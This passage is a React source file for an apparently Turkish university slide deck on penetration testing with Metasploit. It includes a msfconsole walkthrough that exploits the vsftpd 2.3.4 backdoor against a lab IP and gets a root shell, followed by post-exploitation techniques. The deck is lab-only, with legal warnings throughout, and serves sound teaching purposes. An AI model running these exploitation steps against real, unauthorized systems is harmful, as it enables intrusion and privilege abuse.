          { icon: Zap, name: "Payload", color: "#fbbf24", desc: "Zafiyet açıldıktan sonra hedefte çalışacak kod — örn. reverse shell, Meterpreter." },
          { icon: Network, name: "Listener", color: "#a78bfa", desc: "Hedeften gelecek bağlantıyı bekleyen handler (LHOST/LPORT)." },
          { icon: Server, name: "Session", color: "#34d399", desc: "Başarılı istismar sonucu açılan etkileşimli oturum; hedefi yönetirsin." },
        ].map((c, i) => (
          <motion.div
            key={c.name}
            initial={{ opacity: 0, y: 24 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.12 + i * 0.1 }}
            className="sgbh-card rounded-xl p-5"
          >
            <div
              className="w-11 h-11 rounded-lg flex items-center justify-center mb-3"
              style={{ background: `${c.color}18`, border: `1px solid ${c.color}55` }}
            >
              <c.icon className="w-5 h-5" style={{ color: c.color }} />
            </div>
            <div className="text-base font-semibold text-white mb-1.5">{c.name}</div>
            <p className="text-xs text-gray-400 leading-relaxed">{c.desc}</p>
          </motion.div>
        ))}
      </div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mt-6 sgbh-card rounded-lg px-5 py-4 max-w-4xl"
      >
        <div className="text-[10px] font-mono uppercase tracking-widest text-[#fbbf24] mb-2">Reverse vs bind payload</div>
        <div className="flex items-center gap-2 text-xs text-gray-300 flex-wrap font-mono">
          <span className="px-2 py-1 rounded bg-black/40 text-[#34d399]">reverse</span>
          <span className="text-gray-500">hedef &rarr; saldırgana bağlanır (firewall&apos;ı daha kolay aşar)</span>
          <span className="text-gray-600 mx-2">·</span>
          <span className="px-2 py-1 rounded bg-black/40 text-[#67e8f9]">bind</span>
          <span className="text-gray-500">hedef bir port açar, saldırgan bağlanır</span>
        </div>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 14. msfconsole search tablosu ───── */
  () => (
    <SlideShell>
      <Eyebrow>msfconsole · modül arama</Eyebrow>
      <H2 className="mb-2">Doğru modülü seçmek</H2>
      <Sub className="max-w-3xl mb-6">
        <span className="font-mono text-white">search</span> ile zafiyete uygun modülü buluruz.
        <span className="font-mono text-[#34d399]"> Rank</span> sütunu istismarın güvenilirliğini
        gösterir; <span className="text-[#86efac]">excellent</span> hedefi çökertme olasılığı en düşük
        olandır. Burada vsftpd arka kapısını seçiyoruz.
      </Sub>
      <MsfSearchTable />
    </SlideShell>
  ),

  /* ───── 15. msfconsole istismar terminali ───── */
  () => (
    <SlideShell>
      <Eyebrow>msfconsole · uçtan uca istismar</Eyebrow>
      <H2 className="mb-2">use → set → exploit → session</H2>
      <Sub className="max-w-3xl mb-6">
        Akış her zaman aynıdır: modülü seç, hedef ve dinleyici parametrelerini gir, çalıştır,
        açılan oturumu yönet. Bu örnek vsftpd 2.3.4 arka kapısını kullanır.
      </Sub>
      <TerminalWindow title="msf6 — exploit/unix/ftp/vsftpd_234_backdoor">
        <div><span className="sgbh-term-msf">msf6</span> <span className="sgbh-term-dim">&gt;</span> <span className="sgbh-term-cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span></div>
        <div><span className="sgbh-term-msf">msf6 exploit(vsftpd_234_backdoor)</span> <span className="sgbh-term-dim">&gt;</span> <span className="sgbh-term-cmd">set RHOSTS 192.168.56.101</span></div>
        <div className="sgbh-term-dim">RHOSTS =&gt; 192.168.56.101</div>
        <div><span className="sgbh-term-msf">msf6 exploit(vsftpd_234_backdoor)</span> <span className="sgbh-term-dim">&gt;</span> <span className="sgbh-term-cmd">exploit</span></div>
        <div className="mt-1"><span className="sgbh-term-ok">[*]</span> <span className="sgbh-term-dim">192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)</span></div>
        <div><span className="sgbh-term-ok">[+]</span> <span className="sgbh-term-dim">192.168.56.101:21 - Backdoor service has been spawned, handling...</span></div>
        <div><span className="sgbh-term-ok">[+]</span> <span className="sgbh-term-dim">192.168.56.101:21 - UID: uid=0(<span className="sgbh-term-err">root</span>) gid=0(root)</span></div>
        <div><span className="sgbh-term-ok">[*]</span> <span className="sgbh-term-dim">Command shell session 1 opened (192.168.56.10:44321 -&gt; 192.168.56.101:6200)</span></div>
        <div className="mt-2"><span className="sgbh-term-prompt">whoami</span></div>
        <div className="sgbh-term-err">root</div>
        <div><span className="sgbh-term-prompt">hostname</span></div>
        <div className="sgbh-term-dim">metasploitable</div>
        <div className="mt-2">
          <span className="sgbh-term-prompt">$</span>{" "}
          <span className="sgbh-term-cmd">_</span>
          <span className="animate-pulse">█</span>
        </div>
      </TerminalWindow>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.8 }}
        className="mt-4 text-[11px] text-gray-500 font-mono"
      >
        Sonuç: <span className="text-[#f87171]">root</span> kabuğu. Bulgu kanıtlandı — bir ekran görüntüsü
        rapora gider, hedefte hiçbir kalıcı değişiklik bırakılmaz.
      </motion.div>
    </SlideShell>
  ),

  /* ───── 16. Post-exploitation ───── */
  () => (
    <SlideShell>
      <Eyebrow>Faz 6 · post-exploitation</Eyebrow>
      <H2 className="mb-2">İçeri girdik — peki ya sonra?</H2>
      <Sub className="max-w-3xl mb-8">
        Tek bir kabuk başlangıçtır, hedef değil. Post-exploit, erişimin gerçek iş etkisini
        ölçer: ne kadar derine inilebilir, hangi veriye ulaşılır? Hepsi kapsam ve izin dahilinde.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {[
          { icon: ArrowUpCircle, title: "Hak yükseltme", desc: "Sınırlı kullanıcıdan root/SYSTEM&apos;e geçiş (yerel zafiyet, yanlış yapılandırma).", accent: "#fbbf24" },
          { icon: Footprints, title: "Kalıcılık", desc: "Yeniden başlatmada erişimi koruma (lab&apos;da gösterilir, gerçek testte kapsam izniyle).", accent: "#a78bfa" },
          { icon: Network, title: "Yanal hareket (pivoting)", desc: "Ele geçirilen makineyi atlama taşı yapıp iç ağdaki diğer sistemlere ulaşma.", accent: "#06b6d4" },
          { icon: KeyRound, title: "Veri & kimlik toplama", desc: "Parola hash&apos;leri, anahtarlar, hassas dosyalar; etkiyi kanıtlamak için kanıt.", accent: "#34d399" },
        ].map((t, i) => (
          <motion.div
            key={t.title}
            initial={{ opacity: 0, x: i % 2 === 0 ? -20 : 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.15 + i * 0.1 }}
            className="sgbh-card sgbh-card-hover rounded-xl p-5 flex items-start gap-4"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ background: `${t.accent}18`, border: `1px solid ${t.accent}55` }}
            >
              <t.icon className="w-5 h-5" style={{ color: t.accent }} />
            </div>
            <div>
              <h3 className="text-base font-semibold text-white mb-1" dangerouslySetInnerHTML={{ __html: t.title }} />
              <p className="text-sm text-gray-400 leading-relaxed" dangerouslySetInnerHTML={{ __html: t.desc }} />
            </div>
          </motion.div>
        ))}
      </div>
    </SlideShell>
  ),

  /* ───── 17. Raporlama ───── */
  () => (
    <SlideShell>
      <Eyebrow>Faz 7 · raporlama</Eyebrow>
      <H2 className="mb-2">Asıl ürün rapordur</H2>
      <Sub className="max-w-3xl mb-6">
        Müşteri root kabuğu için değil, anlaşılır ve önceliklendirilmiş bir rapor için ödeme yapar.
        Her bulgu kanıt, etki ve çözümle birlikte sunulur; her zafiyet bir CVSS skoruyla
        önceliklendirilir.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.2 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="flex items-center gap-2 mb-3 text-[#34d399]">
            <FileText className="w-5 h-5" />
            <span className="text-xs font-mono uppercase tracking-widest">Bir bulgu kaydında olması gereken</span>
          </div>
          <ul className="space-y-2.5 text-sm text-gray-300">
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />Başlık, etkilenen varlık ve zafiyet türü.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />CVSS skoru &amp; önem (kritik/yüksek/orta/düşük).</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />Yeniden üretme adımları + ekran görüntüsü kanıtı.</li>
            <li className="flex gap-2"><ChevronRight className="w-4 h-4 mt-0.5 text-[#34d399] flex-shrink-0" />İş etkisi ve somut çözüm önerisi.</li>
          </ul>
        </motion.div>
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.35 }}
          className="sgbh-card rounded-xl p-6"
        >
          <div className="text-xs font-mono uppercase tracking-widest text-[#06b6d4] mb-3">CVSS önem seviyeleri</div>
          <table className="sgbh-tbl">
            <thead>
              <tr>
                <th style={{ width: "34%" }}>Skor</th>
                <th>Önem</th>
              </tr>
            </thead>
            <tbody>
              <tr><td className="font-mono">9.0 – 10.0</td><td><span className="sgbh-pill" style={{ background: "rgba(239,68,68,0.15)", color: "#fca5a5", border: "1px solid rgba(239,68,68,0.35)" }}>Kritik</span></td></tr>
              <tr><td className="font-mono">7.0 – 8.9</td><td><span className="sgbh-pill" style={{ background: "rgba(251,146,60,0.15)", color: "#fdba74", border: "1px solid rgba(251,146,60,0.35)" }}>Yüksek</span></td></tr>
              <tr><td className="font-mono">4.0 – 6.9</td><td><span className="sgbh-pill" style={{ background: "rgba(251,191,36,0.15)", color: "#fde047", border: "1px solid rgba(251,191,36,0.35)" }}>Orta</span></td></tr>
              <tr><td className="font-mono">0.1 – 3.9</td><td><span className="sgbh-pill sgbh-pill-a">Düşük</span></td></tr>
            </tbody>
          </table>
          <p className="text-[11px] text-gray-500 mt-3">Aralıklar CVSS v3.1 niteliksel ölçeğine göredir.</p>
        </motion.div>
      </div>
    </SlideShell>
  ),

  /* ───── 18. Uygulamalı lab ───── */
  () => (
    <SlideShell>
      <Eyebrow>Bu hafta · uygulamalı lab</Eyebrow>
      <H2>Kendi izole laboratuvarında beş adım</H2>
      <Sub className="mt-3 max-w-3xl">
        Lab tamamen kendi host-only ağında (Kali + Metasploitable 2). Sonraki derse bu beşi
        yapmış, ekran görüntülerini almış ve mini bir bulgu kaydı yazmış gelmen bekleniyor.
      </Sub>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
        {[
          { icon: Network, title: "Lab&apos;ı kur ve doğrula", desc: "Kali + Metasploitable 2&apos;yi host-only ağda kur; karşılıklı ping ile bağlantıyı doğrula.", accent: "#a78bfa" },
          { icon: Search, title: "Hedefi tara", desc: "sudo nmap -sV -p- ile açık portları ve sürümleri listele; çıktıyı kaydet.", accent: "#fbbf24" },
          { icon: Bug, title: "Bir modül seç ve istismar et", desc: "msfconsole&apos;da vsftpd_234_backdoor modülünü kullan; RHOSTS ayarla, exploit ile kabuk al.", accent: "#f87171" },
          { icon: Terminal, title: "Erişimi kanıtla", desc: "Açılan oturumda whoami ve hostname çalıştır; root erişimini ekran görüntüsüyle belgele.", accent: "#06b6d4" },
          { icon: FileText, title: "Bir bulgu kaydı yaz", desc: "Zafiyet, etki, kanıt ve çözüm önerisini içeren tek sayfalık mini rapor hazırla.", accent: "#34d399" },
        ].map((t, i) => (
          <motion.div
            key={t.title}
            initial={{ opacity: 0, x: i % 2 === 0 ? -20 : 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ delay: 0.12 + i * 0.08 }}
            className="sgbh-card sgbh-card-hover rounded-xl p-5 flex items-start gap-4"
          >
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ background: `${t.accent}18`, border: `1px solid ${t.accent}55` }}
            >
              <t.icon className="w-5 h-5" style={{ color: t.accent }} />
            </div>
            <div>
              <div className="flex items-center gap-2 mb-1">
                <span className="w-5 h-5 rounded-full border border-gray-600 flex items-center justify-center text-[10px] text-gray-500 font-mono">{i + 1}</span>
                <h3 className="text-base font-semibold text-white" dangerouslySetInnerHTML={{ __html: t.title }} />
              </div>
              <p className="text-sm text-gray-400 leading-relaxed" dangerouslySetInnerHTML={{ __html: t.desc }} />
            </div>
          </motion.div>
        ))}
      </div>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ delay: 0.7 }}
        className="mt-6 sgbh-card-warn rounded-lg px-4 py-3 text-xs text-gray-300 flex items-start gap-3 max-w-4xl"
      >
        <Scale className="w-4 h-4 text-[#f87171] mt-0.5 flex-shrink-0" />
        <span>
          <span className="text-white">Yalnızca kendi laboratuvarında.</span> Sana ait olmayan bir sisteme
          izinsiz erişim/istismar TCK 243-245 kapsamında suçtur. Yazılı izin ve kapsam = sınırı çizen tek şey.
        </span>
      </motion.div>
    </SlideShell>
  ),

  /* ───── 19. Sıradaki hafta + kapanış ───── */
  () => (
    <SlideShell>
      <div className="text-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.7 }}
          animate={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.7 }}
          className="inline-flex w-24 h-24 rounded-2xl items-center justify-center mb-8"
          style={{ background: "linear-gradient(135deg,#06b6d4,#0e7490)", boxShadow: "0 30px 80px -20px rgba(6,182,212,0.6)" }}
        >
          <ShieldCheck className="w-12 h-12 text-white" />
        </motion.div>
        <Eyebrow>9. hafta tamamlandı · sıradaki: Olay Müdahalesi &amp; SIEM</Eyebrow>
        <H1>
          <span className="sgbh-shimmer-soft">Saldırdık · şimdi tespit edeceğiz</span>
        </H1>
        <Sub className="mt-6 max-w-2xl mx-auto">
          Bu hafta saldırgan gibi düşünüp izinli bir istismar yaptık. Hafta 10&apos;da masanın diğer
          tarafına geçiyoruz: log toplama, SIEM korelasyonu ve olay müdahale yaşam döngüsü ile bu
          saldırıyı nasıl yakalarız?
        </Sub>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-10 max-w-4xl mx-auto">
          <FeatureCard icon={ListChecks} title="Log toplama" desc="Sistem, ağ ve uygulama loglarını merkezde toplama." accent="#06b6d4" delay={0.1} />
          <FeatureCard icon={Eye} title="SIEM" desc="Korelasyon kuralları ve alarmla anormali yakalama." accent="#fbbf24" delay={0.18} />
          <FeatureCard icon={Crosshair} title="Tespit" desc="Bu haftaki istismarın hangi izleri bıraktığını okuma." accent="#f87171" delay={0.26} />
          <FeatureCard icon={ShieldCheck} title="Müdahale" desc="Hazırlık → tespit → kapsama → kurtarma döngüsü." accent="#34d399" delay={0.34} />
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-10 max-w-3xl mx-auto text-left">
          <div className="sgbh-card rounded-xl p-5">
            <Calendar className="w-5 h-5 text-[#06b6d4] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Ders saati</div>
            <div className="text-white font-semibold">Çarşamba</div>
            <div className="text-sm text-gray-400">13:30 — 17:00</div>
          </div>
          <div className="sgbh-card rounded-xl p-5">
            <Target className="w-5 h-5 text-[#a78bfa] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Hazırlık</div>
            <div className="text-white font-semibold">Kali + Metasploitable</div>
            <div className="text-sm text-gray-400">labı kurulu getir</div>
          </div>
          <div className="sgbh-card rounded-xl p-5">
            <Brain className="w-5 h-5 text-[#34d399] mb-3" />
            <div className="text-xs uppercase tracking-widest text-gray-500 font-mono mb-1">Teslim</div>
            <div className="text-white font-semibold">Lab raporu</div>
            <div className="text-sm text-gray-400">5 adım + bulgu kaydı</div>
          </div>
        </div>
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1, duration: 0.6 }}
          className="mt-10 text-xs font-mono text-gray-600 flex items-center justify-center gap-2"
        >
          <Sparkles className="w-3.5 h-3.5" />
          <span>İzinsiz test yok · yazılı izin + kapsam + yalnızca kendi labın</span>
        </motion.div>
      </div>
    </SlideShell>
  ),
];

const TOTAL = slides.length;

/* ============================================================
   PRESENTATION ROOT
   ============================================================ */

export default function Presentation() {
  const [current, setCurrent] = useState(0);
  const [direction, setDirection] = useState(1);
  const [isFs, setIsFs] = useState(false);

  const next = useCallback(() => {
    setDirection(1);
    setCurrent((c) => Math.min(c + 1, TOTAL - 1));
  }, []);
  const prev = useCallback(() => {
    setDirection(-1);
    setCurrent((c) => Math.max(c - 1, 0));
  }, []);

  useEffect(() => {
    function onKey(e: KeyboardEvent) {
      if (e.key === "ArrowRight" || e.key === " " || e.key === "PageDown") {
        e.preventDefault();
        next();
      } else if (e.key === "ArrowLeft" || e.key === "PageUp") {
        e.preventDefault();
        prev();
      } else if (e.key.toLowerCase() === "f") {
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen?.();
        } else {
          document.exitFullscreen?.();
        }
      } else if (e.key === "Home") {
        setDirection(-1);
        setCurrent(0);
      } else if (e.key === "End") {
        setDirection(1);
        setCurrent(TOTAL - 1);
      }
    }
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [next, prev]);

  useEffect(() => {
    function onFs() {
      setIsFs(Boolean(document.fullscreenElement));
    }
    document.addEventListener("fullscreenchange", onFs);
    return () => document.removeEventListener("fullscreenchange", onFs);
  }, []);

  const touch = useRef<{ x: number } | null>(null);

  const slideContent = slides[current](true);
  const progress = ((current + 1) / TOTAL) * 100;

  return (
    <div
      className="fixed inset-0 bg-black overflow-hidden text-white"
      onTouchStart={(e) => {
        touch.current = { x: e.touches[0].clientX };
      }}
      onTouchEnd={(e) => {
        if (!touch.current) return;
        const dx = e.changedTouches[0].clientX - touch.current.x;
        if (Math.abs(dx) > 60) (dx > 0 ? prev : next)();
        touch.current = null;
      }}
    >
      <div className="absolute top-0 left-0 right-0 h-[3px] bg-white/5 z-50">
        <motion.div
          className="h-full"
          style={{
            background: "linear-gradient(90deg, #06b6d4, #67e8f9, #06b6d4)",
            boxShadow: "0 0 16px rgba(6,182,212,0.6)",
          }}
          animate={{ width: `${progress}%` }}
          transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
        />
      </div>

      <div className="absolute top-0 left-0 right-0 z-40 flex items-center justify-between px-8 py-4 text-[10px] font-mono uppercase tracking-wider">
        <div className="text-[#06b6d4]/70">
          BVA 2205 · 9. Hafta · Sızma Testi (PTES &amp; Metasploit)
        </div>
        <div className="flex items-center gap-3">
          <div className="text-[#06b6d4]/50">
            <span className="text-[#06b6d4]">
              {String(current + 1).padStart(2, "0")}
            </span>
            <span className="mx-1">/</span>
            {String(TOTAL).padStart(2, "0")}
          </div>
          <button
            onClick={() => {
              if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen?.();
              } else {
                document.exitFullscreen?.();
              }
            }}
            className="p-1.5 text-gray-500 hover:text-[#06b6d4] transition-colors"
            aria-label="Tam ekran"
          >
            {isFs ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
          </button>
        </div>
      </div>

      <AnimatePresence mode="wait" custom={direction}>
        <motion.div
          key={current}
          custom={direction}
          initial={{ opacity: 0, x: direction * 60 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -direction * 30 }}
          transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
          className="absolute inset-0"
        >
          {slideContent}
        </motion.div>
      </AnimatePresence>

      <button
        onClick={prev}
        disabled={current === 0}
        aria-label="Önceki slayt"
        className="absolute left-0 top-12 bottom-16 w-[12%] z-30 cursor-w-resize disabled:cursor-default opacity-0"
      />
      <button
        onClick={next}
        disabled={current === TOTAL - 1}
        aria-label="Sonraki slayt"
        className="absolute right-0 top-12 bottom-16 w-[12%] z-30 cursor-e-resize disabled:cursor-default opacity-0"
      />

      <div className="absolute bottom-0 left-0 right-0 z-40 px-8 py-4 flex items-center justify-between border-t border-white/5 bg-black/60 backdrop-blur">
        <button
          onClick={prev}
          disabled={current === 0}
          className="flex items-center gap-2 px-4 py-2 text-xs text-gray-500 hover:text-[#06b6d4] disabled:opacity-20 disabled:cursor-not-allowed transition-colors"
        >
          <ChevronLeft className="w-4 h-4" />
          Önceki
        </button>
        <div className="flex items-center gap-1 max-w-[60%] overflow-hidden">
          {Array.from({ length: TOTAL }).map((_, i) => (
            <button
              key={i}
              onClick={() => {
                setDirection(i > current ? 1 : -1);
                setCurrent(i);
              }}
              aria-label={`Slayt ${i + 1}`}
              className={`h-1.5 rounded-full transition-all ${
                i === current
                  ? "w-5 bg-[#06b6d4]"
                  : "w-1.5 bg-white/15 hover:bg-white/40"
              }`}
              style={
                i === current
                  ? { boxShadow: "0 0 10px rgba(6,182,212,0.6)" }
                  : undefined
              }
            />
          ))}
        </div>
        <button
          onClick={next}
          disabled={current === TOTAL - 1}
          className="flex items-center gap-2 px-4 py-2 text-xs text-gray-500 hover:text-[#06b6d4] disabled:opacity-20 disabled:cursor-not-allowed transition-colors"
        >
          Sonraki
          <ChevronRight className="w-4 h-4" />
        </button>
      </div>

      <div className="absolute bottom-3 right-8 text-[9px] font-mono text-gray-700 z-50 hidden md:flex items-center gap-2">
        <Keyboard className="w-3 h-3" />
        <span>← → · F · Esc</span>
      </div>
    </div>
  );
}
